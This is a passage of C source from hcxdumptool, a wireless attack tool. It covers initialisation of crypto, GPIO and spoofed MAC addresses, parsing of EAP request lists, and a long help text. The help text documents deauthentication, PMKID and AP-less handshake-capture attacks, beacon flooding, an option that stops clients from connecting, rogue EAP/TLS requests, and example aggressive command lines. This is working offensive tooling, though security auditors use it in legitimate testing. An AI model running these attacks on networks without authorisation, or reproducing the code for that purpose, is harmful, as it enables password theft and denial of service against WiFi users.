
bcbeacondataopenlen = BCBEACON_OPEN_TEMPL_SIZE;
memcpy(&bcbeacondataopen, &bcbeacondata_open_templ, bcbeacondataopenlen);
bcbeacondataopenchanoffset = BCBEACON_OPEN_TEMPL_CHANOFFSET;

return;
}
/*===========================================================================*/
static inline bool processeapreqlist(char *optarglist)
{
static char *opt_ptr;
static char *col_ptr;
eapreqlist_t *zeiger;

memset(eapreqlist, 0, (EAPREQLIST_MAX *EAPREQLIST_SIZE));
opt_ptr = strtok(optarglist, ",");
zeiger = eapreqlist;
eapreqentries = 0;
while(opt_ptr != NULL)
	{
	col_ptr = strchr(opt_ptr, ':');
	if(col_ptr == opt_ptr +1)
		{
		switch(opt_ptr[0])
			{
			case 'T':
			case 't':
				zeiger->mode = EAPREQLIST_MODE_TLS;
			}
		opt_ptr = col_ptr +1;
		col_ptr = strchr(opt_ptr, ':');
		}
	if(col_ptr != NULL)
		{
		zeiger->length = (((col_ptr -opt_ptr) /2) -1);
		switch(col_ptr[1])
			{
			case 0:
				break;
			case 'F':
			case 'f':
				zeiger->termination = EAP_CODE_FAILURE;
				break;
			case 'S':
			case 's':
				zeiger->termination = EAP_CODE_SUCCESS;
				break;
			case 'I':
			case 'i':
				zeiger->termination = EAP_CODE_INITIATE;
				break;
			case 'N':
			case 'n':
				zeiger->termination = EAP_CODE_FINISH;
				break;
			case 'D':
			case 'd':
				zeiger->termination = EAPREQLIST_TERM_DEAUTH;
				break;
			case 'T':
			case 't':
				zeiger->termination = EAPREQLIST_TERM_ENDTLS;
				break;
			case '-':
				zeiger->termination = EAPREQLIST_TERM_NOTERM;
				break;
			}
		}
	else
		{
		zeiger->length = (strlen(opt_ptr) /2) -1;
		}
	if(hex2bin(opt_ptr, &zeiger->type, zeiger->length +1) == false) return false;
	eapreqentries++;
	zeiger++;
	if(zeiger >= eapreqlist + (EAPREQLIST_MAX *EAPREQLIST_SIZE)) break;
	opt_ptr = strtok(NULL, ",");
	}
return true;
}
/*===========================================================================*/
static bool evpdeinitwpa()
{
if(ctxhmac != NULL)
	{
	EVP_MAC_CTX_free(ctxhmac);
	EVP_MAC_free(hmac);
	}
if(ctxcmac != NULL)
	{
	EVP_MAC_CTX_free(ctxcmac);
	EVP_MAC_free(cmac);
	}
EVP_cleanup();
CRYPTO_cleanup_all_ex_data();
ERR_free_strings();
return true;
}
/*===========================================================================*/
static bool evpinitwpa()
{
static unsigned long opensslversion;

ERR_load_crypto_strings();
OpenSSL_add_all_algorithms();
ERR_load_crypto_strings();
OpenSSL_add_all_algorithms();
opensslversion = OpenSSL_version_num();
opensslversionmajor = (opensslversion & 0x10000000L) >> 28;
opensslversionminor = (opensslversion & 0x01100000L) >> 20;

hmac = NULL;
ctxhmac = NULL;
cmac = NULL;
ctxcmac = NULL;

hmac = EVP_MAC_fetch(NULL, "hmac", NULL);
if(hmac == NULL) return false;
cmac = EVP_MAC_fetch(NULL, "cmac", NULL);
if(cmac == NULL) return false;

paramsmd5[0] = OSSL_PARAM_construct_utf8_string("digest", "md5", 0);
paramsmd5[1] = OSSL_PARAM_construct_end();

paramssha1[0] = OSSL_PARAM_construct_utf8_string("digest", "sha1", 0);
paramssha1[1] = OSSL_PARAM_construct_end();

paramssha256[0] = OSSL_PARAM_construct_utf8_string("digest", "sha256", 0);
paramssha256[1] = OSSL_PARAM_construct_end();

paramsaes128[0] = OSSL_PARAM_construct_utf8_string("cipher", "aes-128-cbc", 0);
paramsaes128[1] = OSSL_PARAM_construct_end();

ctxhmac = EVP_MAC_CTX_new(hmac);
if(ctxhmac == NULL) return false;
ctxcmac = EVP_MAC_CTX_new(cmac);
if(ctxcmac == NULL) return false;
return true;
}
/*===========================================================================*/
static inline bool tlsinit()
{
SSL_load_error_strings();
OpenSSL_add_ssl_algorithms();
if((tlsctx = SSL_CTX_new(SSLv23_server_method())) == NULL)
	{
	fprintf(stderr, "OpenSSl can't create SSL context\n");
	return false;
	}
if(SSL_CTX_use_certificate_file(tlsctx, eapservercertname, SSL_FILETYPE_PEM) <= 0)
	{
	ERR_print_errors_fp(stderr);
	return false;
	}
if(SSL_CTX_use_PrivateKey_file(tlsctx, eapserverkeyname, SSL_FILETYPE_PEM) <= 0)
	{
	ERR_print_errors_fp(stderr);
	return false;
	}
if((eaptlsctx = (eaptlsctx_t*)malloc(EAPTLSCTX_SIZE)) == NULL) return false;
memset(eaptlsctx, 0, EAPTLSCTX_SIZE);
SSL_CTX_set_session_cache_mode(tlsctx, SSL_SESS_CACHE_OFF);
SSL_CTX_set_ecdh_auto(tlsctx, 1);
SSL_CTX_set_verify(tlsctx, (SSL_VERIFY_PEER|SSL_VERIFY_CLIENT_ONCE), eap_tls_clientverify_cb);
#if(OPENSSL_VERSION_NUMBER >= 0x10100000L)
SSL_CTX_set_min_proto_version(tlsctx, TLS1_VERSION);
SSL_CTX_set_max_proto_version(tlsctx, TLS1_2_VERSION);
#else
SSL_CTX_set_options(tlsctx, SSL_OP_NO_SSLv2);
SSL_CTX_set_options(tlsctx, SSL_OP_NO_SSLv3);
#endif
SSL_CTX_set_quiet_shutdown(tlsctx, 0);
return true;
}
/*===========================================================================*/
static inline bool globalinit()
{
static int c;
static unsigned int gpiobasemem = 0;
static unsigned int seed;

gettimeofday(&tv, NULL);
tvold.tv_sec = tv.tv_sec;
tvold.tv_usec = tv.tv_usec;
tvlast_sec = tv.tv_sec;
timestampstart = ((uint64_t)tv.tv_sec *1000000) +tv.tv_usec;
timestamp = timestampstart;
sleepled.tv_sec = 0;
sleepled.tv_nsec = GPIO_LED_DELAY;
sleepled2.tv_sec = 0;
sleepled2.tv_nsec = GPIO_LED_DELAY +GPIO_LED_DELAY;
fd_socket_mccli = 0;
fd_socket_mcsrv = 0;
fd_socket_srv = 0;
gpiopresenceflag = false;
if((gpiobutton > 0) || (gpiostatusled > 0))
	{
	if(gpiobutton == gpiostatusled)
		{
		fprintf(stderr, "same value for wpi_button and wpi_statusled is not allowed\n");
		return false;
		}
	gpiobasemem = getgpiobasemem();
	if(gpiobasemem == 0)
		{
		fprintf(stderr, "failed to locate GPIO\n");
		return false;
		}
	if(initgpio(gpiobasemem) == false)
		{
		fprintf(stderr, "failed to init GPIO\n");
		return false;
		}
	if(gpiostatusled > 0)
		{
		INP_GPIO(gpiostatusled);
		OUT_GPIO(gpiostatusled);
		}
	if(gpiobutton > 0)
		{
		INP_GPIO(gpiobutton);
		}
	gpiopresenceflag = true;
	}
if(gpiostatusled > 0)
	{
	for (c = 0; c < 5; c++)
		{
		GPIO_SET = 1 << gpiostatusled;
		nanosleep(&sleepled, NULL);
		GPIO_CLR = 1 << gpiostatusled;
		nanosleep(&sleepled2, NULL);
		}
	}
seed = rpisn +tv.tv_sec;
srand(seed);

if((filteraplist = (maclist_t*)calloc((FILTERLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
if((filterclientlist = (maclist_t*)calloc((FILTERLIST_MAX +1), MACLIST_SIZE)) == NULL) return false;
if((aplist = (macessidlist_t*)calloc((APLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
if((rglist = (macessidlist_t*)calloc((RGLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
rgbeaconptr = rglist;
if((rgbeaconlist = (macessidlist_t*)calloc((RGLIST_MAX +1), MACESSIDLIST_SIZE)) == NULL) return false;
rgbeaconlistptr = rgbeaconlist;
if((ownlist = (ownlist_t*)calloc((OWNLIST_MAX +1), OWNLIST_SIZE)) == NULL) return false;
if((pmklist = (pmklist_t*)calloc((PMKLIST_MAX +1), PMKLIST_SIZE)) == NULL) return false;
if((pagidlist = (pagidlist_t*)calloc((PAGIDLIST_MAX +1), PAGIDLIST_SIZE)) == NULL) return false;
if((scanlist = (scanlist_t*)calloc((SCANLIST_MAX +1), SCANLIST_SIZE)) == NULL) return false;
if((eapreqlist = (eapreqlist_t*)calloc((EAPREQLIST_MAX +1), EAPREQLIST_SIZE)) == NULL) return false;
myoui_ap = myvendorap[rand() %((MYVENDORAP_SIZE /sizeof(int)))];
mynic_ap = rand() & 0xffffff;
myoui_ap &= 0xfcffff;
mac_myaphidden[5] = mynic_ap & 0xff;
mac_myaphidden[4] = (mynic_ap >> 8) & 0xff;
mac_myaphidden[3] = (mynic_ap >> 16) & 0xff;
mac_myaphidden[2] = myoui_ap & 0xff;
mac_myaphidden[1] = (myoui_ap >> 8) & 0xff;
mac_myaphidden[0] = (myoui_ap >> 16) & 0xff;
mynic_ap++;
mac_myapopen[5] = mynic_ap & 0xff;
mac_myapopen[4] = (mynic_ap >> 8) & 0xff;
mac_myapopen[3] = (mynic_ap >> 16) & 0xff;
mac_myapopen[2] = myoui_ap & 0xff;
mac_myapopen[1] = (myoui_ap >> 8) & 0xff;
mac_myapopen[0] = (myoui_ap >> 16) & 0xff;
mynic_ap++;
mac_myap[5] = mynic_ap & 0xff;
mac_myap[4] = (mynic_ap >> 8) & 0xff;
mac_myap[3] = (mynic_ap >> 16) & 0xff;
mac_myap[2] = myoui_ap & 0xff;
mac_myap[1] = (myoui_ap >> 8) & 0xff;
mac_myap[0] = (myoui_ap >> 16) & 0xff;
mynic_ap++;
rglist->timestamp = timestampstart;
memcpy(rglist->ap, &mac_myap, 6);
rglist->essidlen = 4;
memcpy(rglist->essid, &myessid, 4);
myoui_client = myvendorclient[rand() %((MYVENDORCLIENT_SIZE /sizeof(int)))];
myoui_client &= 0xffffff;
mac_myclient[5] = rand() & 0xff;
mac_myclient[4] = rand() & 0xff;
mac_myclient[3] = rand() & 0xff;
mac_myclient[2] = myoui_client & 0xff;
mac_myclient[1] = (myoui_client >> 8) &0xff;
mac_myclient[0] = (myoui_client >> 16) &0xff;
memcpy(&mac_myprclient, &mac_myclient, 6);
for(c = 0; c < 32; c++)
	{
	myanonce[c] = rand() %0xff;
	mysnonce[c] = rand() %0xff;
	}
myrc = (rand()%0xfff) +0xf000;
myclientsequence = 1;
myreactivebeaconsequence = 1;
myapsequence = 1;
myapsequence = 1;
mydeauthenticationsequence = 1;
mydisassociationsequence = 1;
myclientsequence = 1;
mytime = 1;
filteraplistentries = 0;
filterclientlistentries = 0;
nmealen = 0;
memset(&nmeatempsentence, 0, NMEA_MAX);
weakcandidatelen = 8;

wantstopflag = false;
reloadfilesflag = false;
errorcount = 0;
radiotaperrorcount = 0;
gpserrorcount = 0;
incomingcount = 0;
outgoingcount = 0;
pmkidcount = 0;
pmkidroguecount = 0;
eapolmp12count = 0;
eapolmp12roguecount = 0;
eapolmp23count = 0;
eapolmp34count = 0;
eapolmp34zeroedcount = 0;
injectionhit = 0;
responsehit = 0;
injectioncount = 0;
injectionratio = 0;
gpscount = 0;
bpf.filter = NULL;
bpf.len = 0;
aktchannel = 0;
if(eaptunflag == true)
	{
	if(tlsinit() == false) return false;
	}
packetsentflag = false;
packetsenttries = 0;
packetsentlen = 0;
signal(SIGINT, programmende);
signal(SIGHUP, reloadfiles);
return true;
}
/*===========================================================================*/
static bool isinterfaceshared()
{
int ec;
static DIR *folder;
struct dirent *entry;

static char interfacepathname[PATH_MAX];

snprintf(interfacepathname, PATH_MAX -1, "/sys/class/ieee80211/%s/device/net", phyinterfacename);
ec = 0;
folder = opendir(interfacepathname);
if(folder == NULL) return true;
while((entry = readdir(folder))) ec++;
closedir(folder);
if(ec == 3) return false;
return true;
}
/*===========================================================================*/
__attribute__ ((noreturn))
static inline void version(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s ZeroBeat\n", eigenname, VERSION_TAG, VERSION_YEAR);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void usage(char *eigenname)
{
fprintf(stdout, "%s %s (C) %s ZeroBeat\n"
	"usage: %s <options>\n"
	"       press ctrl+c to terminate hcxdumptool\n"
	"       press GPIO button to terminate hcxdumptool\n"
	"       hardware modification is necessary, read more:\n"
	"       https://github.com/ZerBea/hcxdumptool/tree/master/docs\n"
	"       do not set monitor mode by third party tools (iwconfig, iw, airmon-ng)\n"
	"       do not run hcxdumptool on logical (NETLINK) interfaces (monx, wlanxmon, prismx, ...) created by airmon-ng and iw\n"
	"       do not run hcxdumptool on virtual machines or emulators\n"
	"       do not run hcxdumptool in combination with tools (channel hopper), that take access to the interface (except: tshark, wireshark, tcpdump)\n"
	"       do not use tools like macchanger, because hcxdumptool runs its own MAC space and will ignore this changes\n"
	"       stop all services (e.g.: wpa_supplicant.service, NetworkManager.service) that take access to the interface\n"
	"\n"
	"short options:\n"
	"-i <interface> : interface (monitor mode will be enabled by hcxdumptool)\n"
	"                 it is mandatory that the driver support ioctl() system calls, monitor mode and full packet injection!\n"
	"-o <dump file> : output file in pcapng format, filename '-' outputs to stdout, '+' outputs to client\n"
	"                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)\n"
	"                 (reference: https://github.com/pcapng/pcapng)\n"
	"-f <frames>    : frames to save\n"
	"                 bitmask:\n"
	"                  0: clear default values\n"
	"                  1: MANAGEMENT frames (default)\n"
	"                  2: EAP and EAPOL frames (default)\n"
	"                  4: IPV4 frames\n"
	"                  8: IPV6 frames\n"
	"                 16: WEP encrypted frames\n"
	"                 32: WPA encrypted frames\n"
	"                 64: vendor defined frames (AWDL)\n"
	"                 to clear default values use -f 0 first, followed by desired frame type (e.g. -f 0 -f 4)\n"
	"-c <digit>     : set frequency (2437,2462,5600,...) or channel (1,2,3, ...)\n"
	"                 default: auto frequency/auto band\n"
	"                 maximum entries: 255\n"
	"                 0 - 1000 treated as channel\n"
	"                   > 1000 treated as frequency in MHz\n"
	"                 on 5GHz and 6Ghz it is recommended to use frequency instead of channel number\n"
	"                 because channel numbers are not longer unique\n"
	"                 standard 802.11 channels (depend on device, driver and world regulatory domain):\n"
	"                 https://en.wikipedia.org/wiki/List_of_WLAN_channels\n"
	"-s <digit>     : set predefined scanlist\n"
	"                 0 = auto frequency/auto band (default)\n"
	"                 1 = %s (optimized 2.4GHz)\n"
	"                 2 = %s (standard 2.4 GHz)\n"
	"                 3 = %s (standard 5GHz)\n"
	"                 4 = %s (standard 2.4GHz/5GHz)\n"
	"-t <seconds>   : stay time on frequency before hopping to the next channel\n"
	"                 default %d seconds\n"
	"-m <interface> : set monitor mode by ioctl() system call and quit\n"
	"-I             : show WLAN interfaces and quit\n"
	"-C             : show available device channels and quit\n"
	"                 if no frequencies are available, interface is probably in use or doesn't support monitor mode\n"
	"                 if additional frequencies are available, firmware, driver and regulatory domain is probably patched\n"
	"-h             : show this help\n"
	"-v             : show version\n"
	"\n"
	"long options:\n"
	"--do_rcascan                       : show radio channel assignment (scan for target access points)\n"
	"                                     this can be used to test that ioctl() calls and packet injection is working\n"
	"                                     if you got no HIT, packet injection is possible not working\n"
	"                                     also it can be used to get information about the target\n"
	"                                     and to determine that the target is in range\n"
	"                                     use this mode to collect data for the filter list\n"
	"                                     run this mode at least for 2 minutes\n"
	"                                     to save all received raw packets use option -o\n"
	"                                     default scanlist: channel 1 ...13\n"
	"--rcascan_max=digit>               : show only n highest ranking lines\n"
	"                                     default: %d lines\n"
	"--rcascan_order=digit>             : rcascan sorting order:\n"
	"                                      0 = sort by PROBERESPONSE count (default)\n"
	"                                      1 = sort by BEACON count\n"
	"                                      2 = sort by CHANNEL\n"
	"--do_targetscan=<MAC_AP>           : same as do_rcascan - hide all networks, except target\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66\n"
	"--reason_code=<digit>              : deauthentication reason code\n"
	"                                      recommended codes:\n"
	"                                      1 WLAN_REASON_UNSPECIFIED\n"
	"                                      2 WLAN_REASON_PREV_AUTH_NOT_VALID\n"
	"                                      4 WLAN_REASON_DISASSOC_DUE_TO_INACTIVITY\n"
	"                                      5 WLAN_REASON_DISASSOC_AP_BUSY\n"
	"                                      6 WLAN_REASON_CLASS2_FRAME_FROM_NONAUTH_STA\n"
	"                                      7 WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA (default)\n"
	"                                      9 WLAN_REASON_STA_REQ_ASSOC_WITHOUT_AUTH\n"
	"--disable_client_attacks           : do not attack clients\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"--stop_client_m2_attacks=<digit>   : stop attacks against CLIENTS after %d M2 frames received\n"
	"                                     affected: ap-less (EAPOL 2/4 - M2) attack\n"
	"                                     require hcxpcangtool --all option\n"
	"                                     warning: that can prevent that a CLIENT can establish a connection to an assigned ACCESS POINT\n"
	"--disable_ap_attacks               : do not attack access points\n"
	"                                     affected: connected clients and client-less (PMKID) attack\n"
	"--stop_ap_attacks=<digit>          : stop attacks against ACCESS POINTs if <n> BEACONs received\n"
	"                                     default: stop after %" PRIu32 " BEACONs\n"
	"--resume_ap_attacks=<digit>        : resume attacks against ACCESS POINTs after <n> BEACONs received\n"
	"                                     default: %" PRIu32 " BEACONs\n"
	"--disable_deauthentication         : do not send deauthentication or disassociation frames\n"
	"                                     affected: conntected clients\n"
	"--silent                           : do not transmit!\n"
	"                                     hcxdumptool is acting like a passive dumper\n"
	"                                     expect possible packet loss\n"
	"--passive                          : channel management is completely disabled - initial channel must be set by a third party tool\n"
	"                                     hcxdumptool is acting like a passive dumper (silent mode)\n"
	"                                     expect possible heavy packet loss\n"
	"--eapoltimeout=<digit>             : set EAPOL TIMEOUT (microseconds)\n"
	"                                     default: %d usec\n"
	"--eapoleaptimeout=<digit>          : set EAPOL EAP TIMEOUT (microseconds) over entire request sequence\n"
	"                                     default: %d usec\n"
	"--bpfc=<file>                      : input kernel space Berkeley Packet Filter (BPF) code\n"
	"                                     affected: incoming and outgoing traffic - that include rca scan\n"
	"                                     steps to create a BPF (it only has to be done once):\n"
	"                                      set hcxdumptool monitormode\n"
	"                                       $ hcxdumptool -m <interface>\n"
	"                                      create BPF to protect a MAC\n"
	"                                       $ tcpdump -i <interface> not wlan addr3 11:22:33:44:55:66 and not wlan addr2 11:22:33:44:55:66 -ddd > protect.bpf\n"
	"                                       where addr3 protect ACCESS POINTs and addr2 protect CLIENTs\n"
	"                                       recommended to protect own devices\n"
	"                                      or create BPF to attack a MAC\n"
	"                                       $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 -ddd > attack.bpf\n"
	"                                       it is strongly recommended to allow all PROBEREQUEST frames (wlan_type mgt && wlan_subtype probe-req)\n"
	"                                       or undirected frames\n"
	"                                       $ tcpdump -i <interface> wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66 or wlan addr3 11:22:33:44:55:66 or wlan addr3 ff:ff:ff:ff:ff:ff -ddd > attack.bpf\n"
	"                                       see man pcap-filter for a list of all filter options\n"
	"                                      to use the BPF code\n"
	"                                       $ hcxdumptool -i <interface> --bpfc=attack.bpf ...\n"
	"                                     notice: this is a protect/attack, a capture and a display filter\n"
	"--filtermode=<digit>               : user space filter mode for filter list\n"
	"                                     mandatory in combination with --filterlist_ap and/or --filterlist_client\n"
	"                                     affected: only outgoing traffic\n"
	"                                     notice: hcxdumptool act as passive dumper and it will capture the whole traffic on the channel\n"
	"                                     0: ignore filter list (default)\n"
	"                                     1: use filter list as protection list\n"
	"                                        do not interact with ACCESS POINTs and CLIENTs from this list\n"
	"                                     2: use filter list as target list\n"
	"                                        only interact with ACCESS POINTs and CLIENTs from this list\n"
	"                                        not recommended, because some useful frames could be filtered out\n"
	"                                     using a filter list doesn't have an affect on rca scan\n"
	"                                     only for testing useful - devices to be protected should be added to BPF\n"
	"                                     notice: this filter option will let hcxdumptool protect or attack a target - it is neither a capture nor a display filter\n"
	"--filterlist_ap=<file or MAC>      : ACCESS POINT MAC or MAC filter list\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n"
	"                                     maximum entries %d\n"
	"                                     run first --do_rcascan to retrieve information about the target\n"
	"--filterlist_ap_vendor=<file>      : ACCESS POINT VENDOR  filter list by VENDOR\n"
	"                                     format: 112233, 11:22:33, 11-22-33 # comment\n"
	"                                     maximum entries %d\n"
	"                                     run first --do_rcascan to retrieve information about the target\n"
	"--filterlist_client=<file or MAC>  : CLIENT MAC or MAC filter list\n"
	"                                     format: 112233445566, 11:22:33:44:55:66, 11-22-33-44-55-66 # comment\n"
	"                                     maximum entries %d\n"
	"                                     due to MAC randomization of the CLIENT, it does not always work!\n"
	"--filterlist_client_VENDOR=<file>  : CLIENT VENDOR filter list\n"
	"                                     format: 112233, 11:22:33, 11-22-33 # comment\n"
	"                                     maximum entries %d\n"
	"                                     due to MAC randomization of the CLIENT, it does not always work!\n"
	"--weakcandidate=<password>         : use this pre shared key (8...63 characters) for weak candidate alert\n"
	"                                     will be stored to pcapng to inform hcxpcapngtool\n"
	"                                     default: %s\n"
	"--essidlist=<file>                 : transmit beacons from this ESSID list\n"
	"                                     maximum total entries: %d ESSIDs\n"
	"                                     the ESSID list is not a filter list!\n"
	"--essidlist_wpaent=<file>          : transmit WPA-Enterprise-only beacons from this ESSID list\n"
	"                                     maximum total entries: %d ESSIDs\n"
	"                                     the ESSID list is not a filter list!\n"
	"--active_beacon                    : transmit beacon from collected ESSIDs and from essidlist once every %ld nsec\n"
	"                                     affected: ap-less\n"
	"--flood_beacon                     : transmit beacon on every received beacon\n"
	"                                     affected: ap-less\n"
	"--infinity                         : prevent that a CLIENT can establish a connection to an assigned ACCESS POINT\n"
	"                                     affected: ACCESS POINTs and CLIENTs\n"
	"--beaconparams=<TLVs>              : update or add Information Elements in all reactive and essidlist beacons\n"
	"                                     maximum %d IEs as TLV hex string, tag id 0 (ESSID) will be ignored, tag id 3 (channel) overwritten\n"
	"                                     multiple IEs with same tag id are added, default IE is overwritten by the first\n"
	"--wpaent                           : enable announcement of WPA-Enterprise in beacons and probe responses in addition to WPA-PSK\n"
	"--eapreq=[<mode>:]<type><data>[:<term>],...\n"
	"                                     send max. %d subsequent EAP requests after initial EAP ID request, hex string starting with EAP Type\n"
	"                                     mode prefix determines layer the request is exclusively send on:\n"
	"                                      T: = only if any TLS tunnel is up, ignored otherwise\n"
	"                                     response is terminated with:\n"
	"                                      :F = EAP Failure\n"
	"                                      :S = EAP Success\n"
	"                                      :I = EAP ERP Initiate\n"
	"                                      :F = EAP ERP Finish\n"
	"                                      :D = Deauthentication\n"
	"                                      :T = TLS shutdown\n"
	"                                      :- = no packet\n"
	"                                     default behavior is terminating all responses with a EAP Failure, after last one the client is deauthenticated\n"
	"--eapreq_follownak                 : jump to Auth Type requested by client in Legacy Nak response, if type available in remaining request sequence\n"
	"--eaptlstun                        : activate TLS tunnel negotiation and Phase 2 EAP requests when requesting PEAP using --eapreq\n"
	"                                     requires --eap_server_cert and --eap_server_key\n"
	"--eap_server_cert=<server.pem>     : EAP TLS tunnel Server cert PEM file\n"
	"--eap_server_key=<server.key>      : EAP TLS tunnel Server private key file\n"
	"--use_gps_device=<device>          : use GPS device (NMEA 0183 protocol)\n"
	"                                     /dev/ttyACM0, /dev/ttyUSB0, ...\n"
	"                                     NMEA 0183 $GPGGA $GPGGA\n"
	"--use_gpsd                         : use GPSD device (NMEA 0183 protocol)\n"
	"                                     NMEA 0183 $GPGGA, $GPRMC\n"
	"--nmea=<file>                      : save track to file\n"
	"                                     format: NMEA 0183 $GPGGA, $GPRMC, $GPWPL\n"
	"                                     to convert it to gpx, use GPSBabel:\n"
	"                                     gpsbabel -i nmea -f hcxdumptool.nmea -o gpx -F file.gpx\n"
	"                                     to display the track, open file.gpx with viking\n"
	"--gpio_button=<digit>              : Raspberry Pi GPIO pin number of button (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--gpio_statusled=<digit>           : Raspberry Pi GPIO number of status LED (2...27)\n"
	"                                     default = GPIO not in use\n"
	"--gpio_statusled_interval=<digit>  : Raspberry Pi GPIO LED flash intervall\n"
	"                                     default = flash every 5 seconds\n"
	"--tot=<digit>                      : enable timeout timer in minutes (minimum = 2 minutes)\n"
	"                                     hcxdumptool will terminate if tot reached (EXIT code = 2)\n"
	"                                     for a successful attack tot > 120 minutes recommended\n"
	"--error_max=<digit>                : terminate hcxdumptool if error maximum reached\n"
	"                                     default: %d errors\n"
	"--reboot                           : once hcxdumptool terminated, reboot system\n"
	"--poweroff                         : once hcxdumptool terminated, power off system\n"
	"--enable_status=<digit>            : enable real-time display (waterfall)\n"
	"                                     only incoming traffic\n"
	"                                     each message is displayed only once at the first occurrence to avoid spamming the real-time display\n"
	"                                     bitmask:\n"
	"                                         0: no status (default)\n"
	"                                         1: EAPOL\n"
	"                                         2: ASSOCIATION and REASSOCIATION\n"
	"                                         4: AUTHENTICATION\n"
	"                                         8: BEACON and PROBERESPONSE\n"
	"                                        16: ROGUE AP\n"
	"                                        32: GPS (once a minute)\n"
	"                                        64: internal status (once a minute)\n"
	"                                       128: run as server\n"
	"                                       256: run as client\n"
	"                                       512: EAP\n"
	"                                      1024: EAP NAK\n"
	"                                     characters < 0x20 && > 0x7e are replaced by .\n"
	"                                     example: show everything but don\'t run as server or client (1+2+4+8+16 = 31)\n"
	"                                              show only EAPOL and ASSOCIATION and REASSOCIATION (1+2 = 3)\n"
	"--ip=<IP address>                  : define IP address for server / client (default: 224.0.0.255)\n"
	"                                     multicast, localhost or client unicast IP address on both sides\n"
	"--server_port=<digit>              : define port for server status output (1...65535)\n"
	"                                   : default IP: %s\n"
	"                                   : default port: %d\n"
	"--client_port=<digit>              : define port for client status read (1...65535)\n"
	"                                     default IP: %s\n"
	"                                     default port: %d\n"
	"--check_driver                     : run several tests to determine that driver support all(!) required ioctl() system calls\n"
	"                                     the driver must support monitor mode and full packet injection\n"
	"                                     otherwise hcxdumptool will not work as expected\n"
	"--check_injection                  : run antenna test and packet injection test to determine that driver support full packet injection\n"
	"                                     packet injection will not work as expected if the Wireless Regulatory Domain is unset\n"
	"--force_interface                  : ignore all ioctl() warnings and error counter\n"
	"                                     allow hcxdumptool to run on a virtual NETLINK monitor interface\n"
	"                                     warning: packet injection and/or channel change may not work as expected\n"
	"                                     you have been warned: do not report issues!\n"
	"--example                          : show abbreviations and example command lines\n"
	"--help                             : show this help\n"
	"--version                          : show version\n"
	"\n"
	"Make sure that the Wireless Regulatory Domain is not unset!\n"
	"It is neither mandatory nor necessary and absolutely not recommended to use high tx power!\n"
	"Run hcxdumptool -i interface --do_rcascan for at least 30 seconds, to get information about the target!\n"
	"It is mandatory to set options and filters tailored to the target!\n"
	"Do not edit, merge or convert this pcapng files, because it will remove optional comment fields!\n"
	"It is much better to run gzip to compress the files. Wireshark, tshark and hcxpcapngtool will understand this,\n"
	"as well as wpa-sec.stanev.org.\n"
	"If hcxdumptool captured your password from WiFi traffic, you should check all your devices immediately!\n"
	"If you use GPS, make sure GPS device is inserted and has a GPS FIX and protocol is set to NMEA 183, before you start hcxdumptool!\n"
	"Recommended tools to show additional 802.11 fields or to decrypt WiFi traffic: Wireshark and/or tshark\n"
	"Recommended tool to convert hashes to formats that hashcat and JtR understand: hcxpcapngtool\n"
	"Recommended tool to get possible PSKs from pcapng file: hcxpcapngtool\n"
	"Important notice:\n"
	"Using filter options, could cause that some useful frames are filtered out!\n"
	"In that case hcxpcapngtool will show a warning that this frames are missing!\n"
	"Use SIGHUB with care, because it will impact pselect()\n"
	"\n",
	eigenname, VERSION_TAG, VERSION_YEAR, eigenname,
	channelscanlist1, channelscanlist2, channelscanlist3, channelscanlist4,
	STAYTIME, SCANLIST_MAX, OW_M1M2ROGUE_MAX, ATTACKSTOP_MAX, ATTACKRESUME_MAX, EAPOLTIMEOUT, EAPOLEAPTIMEOUT, FILTERLIST_MAX, FILTERLIST_MAX, FILTERLIST_MAX, FILTERLIST_MAX, weakcandidate, BEACONEXTLIST_MAX, BEACONEXTLIST_MAX, FDNSECTIMERB, IESETLEN_MAX, EAPREQLIST_MAX, ERROR_MAX, mcip, MCPORT, mcip, MCPORT);
exit(EXIT_SUCCESS);
}
/*---------------------------------------------------------------------------*/
__attribute__ ((noreturn))
static inline void exampleusage(char *eigenname)
{
fprintf(stdout, "%s %s  (C) %s ZeroBeat\n"
	"abbreviations:\n"
	"--------------\n"
	"PMKIDROGUE = PMKID requested from ACCESS POINT by hcxdumptool\n"
	"M1M2ROGUE = M2 requested from CLIENT by hcxdumptool\n"
	"M1M2 = CHALLENGE MESSAGE PAIR\n"
	"M2M3 = AUTHORIZED MESSAGE PAIR\n"
	"M3M4 = AUTHORIZED MESSAGE PAIR\n"
	"M1M4ZEROED = M4 SNONCE is zeroed and cannot be used to calculate MESSAGE PAIR\n"
	"M3M4ZEROED = M4 SNONCE is zeroed and cannot be used to calculate MESSAGE PAIR\n"
	"KDV0 = Key Descriptor Version 0 = Authentication Management Key defined\n"
	"KDV1 = Key Descriptor Version 1 = WPA1 HMAC-MD5\n"
	"KDV2 = Key Descriptor Version 2 = WPA2 HMAC-SHA1\n"
	"KDV3 = Key Descriptor Version 3 = WPA2 AES-128-CMAC\n"
	"\n"
	"example command lines:\n"
	"----------------------\n"
	"simple:\n"
	"$ %s -i wlan0 -o dump.pcapng --enable_status=31\n"
	"\n"
	"modified Raspberry Pi, aggressive, mobile, target APs and CLIENTs:\n"
	"$ %s --gpio_button=4 --gpio_statusled=17 -i wlan0 -o dump.pcapng --poweroff --stop_ap_attacks=6000 --resume_ap_attacks=12000 --bpfc=own.bpfc --essidlist=beaconlist --active_beacon\n"
	"\n"
	"modified Raspberry Pi, stationary, target CLIENTs:\n"
	"$ %s hcxdumptool --gpio_button=4 --gpio_statusled=17 -i wlan0 -o dump.pcapng --tot=1440 --bpfc=own.bpfc --disable_deauthentication --disable_ap_attacks --active_beacon -c 1,3,5,7,9,11,2,4,6,8,10 -t 120\n"
	"\n"
